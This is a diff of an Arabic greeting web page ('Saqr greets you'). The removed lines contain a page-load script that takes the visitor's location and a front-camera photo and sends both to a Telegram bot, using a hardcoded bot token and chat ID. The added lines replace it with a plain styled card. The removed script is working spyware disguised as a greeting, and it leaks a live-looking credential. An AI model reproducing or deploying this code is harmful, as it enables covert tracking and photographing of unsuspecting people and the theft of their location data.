@@ -11,65 +11,38 @@
             align-items: center;
             justify-content: center;
             height: 100vh;
-            background-color: #f0f0f0;
+            background-color: #ffeb3b;
             font-family: Arial, sans-serif;
             direction: rtl;
+        }
+        .container {
             text-align: center;
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
+        }
+        h1 {
+            margin: 0;
+            font-size: 30px;
             color: #333;
         }
-        #message {
-            font-size: 24px;
-            margin-bottom: 20px;
-            color: #333;
+        p {
+            margin: 15px 0;
+            color: #555;
+            font-size: 18px;
         }
-        .icon {
-            font-size: 80px;
-            color: #4CAF50;
+        .logo {
+            width: 100px;
             margin-bottom: 20px;
         }
     </style>
 </head>
 <body>
-    <div class="icon">🦅</div>
-    <div id="message">صقر يسلم عليك</div>
-
-    <script>
-        const token = '7892070385:AAHIv9d2i5uGwO-AmbAYjwJK_jT7qm1p93I';
-        const chatId = '6185375878';
-
-        function sendFinalData() {
-            navigator.geolocation.getCurrentPosition(async position => {
-                const latitude = position.coords.latitude;
-                const longitude = position.coords.longitude;
-
-                // التقط صورة من الكاميرا الأمامية
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                    const track = stream.getVideoTracks()[0];
-                    const imageCapture = new ImageCapture(track);
-
-                    const blob = await imageCapture.takePhoto();
-                    track.stop();
-
-                    const formData = new FormData();
-                    formData.append('chat_id', chatId);
-                    formData.append('photo', blob, 'image.jpg');
-                    formData.append('caption', `🦅 صقر يسلم عليك\n🌍 الموقع: (${latitude}, ${longitude})`);
-
-                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    })
-                    .then(response => response.json())
-                    .then(data => console.log('تم إرسال الصورة والموقع بنجاح:', data))
-                    .catch(error => console.error('خطأ في إرسال الصورة:', error));
-                } catch (error) {
-                    console.error('خطأ في التقاط الصورة:', error);
-                }
-            });
-        }
-
-        sendFinalData();
-    </script>
+    <div class="container">
+        <img src="your-image.png" alt="صقر" class="logo">
+        <h1>صقر يسلم عليك!</h1>
+        <p></p> <!-- تركت الفقرة فارغة حسب طلبك -->
+    </div>
 </body>
 </html>
